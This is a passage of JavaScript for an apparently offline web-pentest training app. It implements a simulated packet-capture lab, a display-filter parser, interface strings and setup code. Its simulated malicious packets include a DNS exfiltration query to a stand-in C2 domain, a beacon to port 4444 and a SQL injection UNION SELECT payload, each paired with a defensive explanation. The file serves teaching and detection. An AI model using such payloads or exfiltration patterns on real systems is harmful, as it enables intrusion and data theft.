    { proto:'ICMP',  src:'192.168.1.10',   dst:'192.168.1.1',   len:74,  info:'Echo (ping) request id=0x01', malicious:false },
    { proto:'TLS',   src:'192.168.1.33',   dst:'151.101.1.140', len:1452,info:'Application Data', malicious:false },
  ];

  const maliciousPackets = [
    { proto:'DNS',  src:'192.168.1.105', dst:'8.8.8.8',    len:98,  info:'Query A 6d616c776172652d646174612e evil-c2.net (long subdomain!)', malicious:true, detail:'DNS Exfiltration beacon!\nSubdomain encodes base64 data: "malware-data"\nDestination: evil-c2.net (known C2 domain)\nAction: Block outbound DNS to evil-c2.net' },
    { proto:'TCP',  src:'192.168.1.105', dst:'13.37.13.37', len:52, info:'[SYN] → 13.37.13.37:4444 (known RAT port)', malicious:true, detail:'C2 Beacon detected!\nDst Port: 4444 (Metasploit default listener)\nRemote IP: 13.37.13.37 (threat intel: known C2)\nPattern: Repeating every 60s (beacon interval)\nAction: Block outbound TCP/4444, isolate host' },
    { proto:'HTTP', src:'192.168.1.105', dst:'203.0.113.99', len:310, info:'GET /api/users?id=1 UNION SELECT username,password,NULL FROM users--', malicious:true, detail:'SQL Injection in URL!\nPayload: UNION SELECT ...\nTarget endpoint: /api/users\nDatabase data at risk: all user credentials\nAction: WAF block, patch parameterized queries' },
    { proto:'FTP',  src:'192.168.1.20',  dst:'203.0.113.5', len:44,  info:'Request: PASS s3cr3t_p@ssw0rd (PLAINTEXT!)', malicious:true, detail:'Plaintext Credentials Exposed!\nProtocol: FTP (no encryption)\nPassword transmitted in clear text\nAnyone on the network can see this!\nAction: Disable FTP, enforce SFTP/SCP' },
  ];

  function renderPacket(pkt, num, ts) {
    const row = document.createElement('div');
    row.className = 'pkt-row' + (pkt.malicious ? ' is-malicious' : '');
    row.innerHTML = `<span>${num}</span><span>${ts}</span><span>${pkt.src}</span><span>${pkt.dst}</span><span class="pkt-proto" data-proto="${pkt.proto}">${pkt.proto}</span><span>${pkt.len}</span>`;
    row.title = pkt.info;
    row.addEventListener('click', () => {
      listEl.querySelectorAll('.pkt-row.is-selected').forEach(r => r.classList.remove('is-selected'));
      row.classList.add('is-selected');
      if (detailEl) {
        detailEl.innerHTML = `<span class="pkt-frame-line">Frame ${num}: ${pkt.len} bytes captured</span>\nTime: ${ts}\nSrc: ${pkt.src}\nDst: ${pkt.dst}\nProtocol: ${pkt.proto}\nInfo: ${escapeHtml(pkt.info)}`;
      }
      if (analysisEl) {
        if (pkt.malicious) {
          analysisEl.dataset.state = 'danger';
          analysisEl.innerHTML = '<strong>THREAT DETECTED</strong><pre class="pkt-pre">' + escapeHtml(pkt.detail) + '</pre>';
        } else {
          delete analysisEl.dataset.state;
          analysisEl.innerHTML = '<strong>Benign traffic</strong> — No indicators of compromise detected in this packet.';
        }
      }
    });
    return row;
  }

  function getFilter() { return filterInput ? filterInput.value.trim().toLowerCase() : ''; }

  function matchesFilter(pkt, filter) {
    if (!filter) return true;
    if (/\s+or\s+/.test(filter)) return filter.split(/\s+or\s+/).some(part => matchesFilter(pkt, part.trim()));
    if (/\s+and\s+/.test(filter)) return filter.split(/\s+and\s+/).every(part => matchesFilter(pkt, part.trim()));
    const f = filter;
    if (f === 'http') return pkt.proto === 'HTTP';
    if (f === 'dns') return pkt.proto === 'DNS';
    if (f === 'tcp') return pkt.proto === 'TCP';
    if (f === 'tls' || f === 'ssl') return pkt.proto === 'TLS';
    if (f === 'ftp') return pkt.proto === 'FTP';
    if (f === 'icmp') return pkt.proto === 'ICMP';
    if (f.includes('ip.dst==')) { const ip = f.split('==')[1]; return pkt.dst.includes(ip); }
    if (f.includes('ip.src==')) { const ip = f.split('==')[1]; return pkt.src.includes(ip); }
    if (f.includes('ip.addr==')) { const ip = f.split('==')[1]; return pkt.src.includes(ip) || pkt.dst.includes(ip); }
    if (f.includes('tcp.dstport==')) { const port = f.split('==')[1]; return pkt.info.includes(':' + port); }
    if (f.includes('dns contains')) { const term = f.split('"')[1] || ''; return pkt.proto === 'DNS' && pkt.info.toLowerCase().includes(term); }
    // Generic text match
    return pkt.info.toLowerCase().includes(f) || pkt.proto.toLowerCase().includes(f) || pkt.src.includes(f) || pkt.dst.includes(f);
  }

  function redrawFiltered() {
    const filter = getFilter();
    listEl.innerHTML = '';
    allPackets.forEach((p, i) => {
      if (matchesFilter(p.pkt, filter)) {
        listEl.appendChild(renderPacket(p.pkt, p.num, p.ts));
      }
    });
    listEl.scrollTop = listEl.scrollHeight;
  }

  if (filterBtn) filterBtn.addEventListener('click', redrawFiltered);
  if (filterInput) filterInput.addEventListener('keydown', e => { if (e.key === 'Enter') redrawFiltered(); });
  if (clearFilterBtn) clearFilterBtn.addEventListener('click', () => { if (filterInput) filterInput.value = ''; redrawFiltered(); });

  // Hook up Quick Filters
  document.querySelectorAll('.quick-filter-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      if (filterInput) {
        if (filterInput.value.trim() && !filterInput.value.trim().endsWith('or')) {
          filterInput.value = filterInput.value.trim() + ' or ' + btn.innerText;
        } else {
          filterInput.value = btn.innerText;
        }
        redrawFiltered();
      }
    });
  });

  function addPacket(pkt) {
    packetIndex++;
    const now = new Date();
    const ts = now.toLocaleTimeString('en-US', {hour12:false}) + '.' + String(now.getMilliseconds()).padStart(3,'0');
    allPackets.push({ pkt, num: packetIndex, ts });
    const filter = getFilter();
    if (matchesFilter(pkt, filter)) {
      const row = renderPacket(pkt, packetIndex, ts);
      listEl.appendChild(row);
      listEl.scrollTop = listEl.scrollHeight;
    }
  }

  if (startBtn) startBtn.addEventListener('click', () => {
    if (captureInterval) {
      clearInterval(captureInterval);
      captureInterval = null;
      startBtn.textContent = '▶ Start Capture';
      startBtn.classList.replace('btn-danger', 'btn-primary');
      return;
    }
    startBtn.textContent = '⏹ Stop Capture';
    startBtn.classList.replace('btn-primary', 'btn-danger');
    let tick = 0;
    // Seed with one malicious packet randomly among the first 20
    const maliciousSlots = [5, 11, 16, 18];
    let malIdx = 0;
    captureInterval = window.__packetCaptureInterval = setInterval(() => {
      if (!document.body.contains(listEl)) { clearInterval(captureInterval); captureInterval = null; return; }
      tick++;
      if (maliciousSlots.includes(tick) && malIdx < maliciousPackets.length) {
        addPacket(maliciousPackets[malIdx++]);
      } else {
        addPacket(normalPackets[Math.floor(Math.random() * normalPackets.length)]);
      }
      if (tick >= 40) {
        clearInterval(captureInterval);
        captureInterval = null;
        startBtn.textContent = '▶ Capture Complete (40 packets)';
        startBtn.classList.replace('btn-danger', 'btn-primary');
      }
    }, 500);
  });
}

/* ═══════════════════════════════════════════════════════════════════════════════
   INTERNATIONALISATION (i18n)  —  English
   ═══════════════════════════════════════════════════════════════════════════════ */

const TRANSLATIONS = {
  en: {
    // Sidebar
    brand_sub: 'Web Pentest Lab Guide',
    btn_settings: 'Settings',
    // Welcome hero
    hero_title: 'Welcome to CyberCompanion',
    hero_desc: 'Select a module from the sidebar to begin your Web Application Penetration Testing journey. Open a built-in lab to practise against offline simulated labs.',
    hero_step1: 'Choose a module',
    hero_step2: 'Open a built-in lab',
    hero_step3: 'Follow step-by-step',
    hero_step4: 'Learn to defend',
    // Module section headers
    section_concept: 'Core Concept',
    section_analogy: 'Real-World Analogy',
    section_steps: 'Hands-on Tutorial',
    section_defense: 'Defense & Remediation',
    section_reference: 'Interactive Reference Table',
    section_challenges: 'Interactive Challenges',
    challenge_intro: 'Put your skills to the test in the built-in offline labs and simulators. Follow an interactive step-by-step tutorial, or try to solve it on your own!',
    // Settings modal
    settings_title: 'Global Settings',
    settings_reset_title: 'Factory Reset',
    settings_reset_desc: 'This will permanently erase your saved settings and progress on this device, then reload the app.',
    settings_reset_btn: 'Wipe Everything',
    confirm_wipe: 'Are you absolutely sure you want to wipe everything?',
    // Module titles (sidebar)
    mod_burp: 'Burp Suite Proxy Interception',
    mod_sqli: 'SQL Injection (SQLi)',
    mod_sqlmap: 'SQLmap Automation',
    mod_nmap: 'Nmap Network Scanning',
    mod_hydra: 'Hydra Brute-Force',
    mod_xss: 'Cross-Site Scripting (XSS)',
    mod_soc: 'SOC Analyst Simulator',
    mod_net: 'Network Traffic Analyst',
    // SOC section
    soc_title: 'Security Operations Center',
    soc_badge: 'ACTIVE AUDIT',
    soc_mission: 'Mission Objective',
    soc_ioc_title: 'Indicators of Compromise (IoCs)',
    soc_remediation_title: 'Remediation Action Required',
    soc_locked: 'Flag a valid threat to unlock Remediation',
    soc_intel_placeholder: 'Select a log entry to analyze IP reputation and threat score.',
    soc_intel_title: 'Threat Intel Feed',
    soc_waf_status: 'WAF Status: Active',
    soc_threats_mitigated: '0 Threats Mitigated',
    soc_scenario_random: 'Random Attack (Recommended)',
    soc_scenario_sqli: 'SQL Injection',
    soc_scenario_xss: 'XSS Attack',
    soc_scenario_brute: 'Brute Force',
    soc_scenario_path: 'Path Traversal',
    soc_scenario_cmdi: 'Command Injection',
    soc_scenario_idor: 'IDOR (Broken Access Control)',
    soc_scenario_ssrf: 'Server-Side Request Forgery',
    soc_action_waf: 'Update WAF Signatures',
    soc_action_rate: 'Rate Limit IP / Subnet',
    soc_action_isolate: 'Isolate Host from Network',
    soc_action_reset: 'Force Password Reset'
  }
};

window.__i18n = TRANSLATIONS.en;

function t(key) {
  return TRANSLATIONS.en[key] || key;
}

function factoryReset() {
  if (socStreamInterval) { clearInterval(socStreamInterval); socStreamInterval = null; }
  localStorage.clear();
  const btn = document.querySelector('.btn-danger-outline');
  if (btn) {
    btn.textContent = 'Wiping saved data...';
    btn.disabled = true;
  }
  window.location.reload();
}

/* ═══════════════════════════════════════════════════════════════════════════════
   EXPOSE & INITIALIZE
   ═══════════════════════════════════════════════════════════════════════════════ */

window.__app = {
  startTutorial,
  startSocSimulator,
  resumeSocSimulator,
  stopSocSimulator,
  exitSoc,
  selectModuleById,
  showHome,
  submitRemediation,
  toggleSettings,
  toggleSidebar,
  factoryReset,
  handleNmapCommand,
  handleHydraCommand,
  handleSqlmapCommand,
  initPacketLab
};

window.TUTORIALS = {};
window.labAPI.getTutorials().then(data => {
  window.TUTORIALS = data || {};

  // Refresh only if a module is actually open (activeModuleIndex starts at -1).
  if (activeModuleIndex >= 0 && activeModuleIndex < MODULES.length) {
    selectModule(activeModuleIndex);
  }
}).catch(err => console.error("Failed to load tutorials via IPC:", err));

buildSidebar();
renderHome();

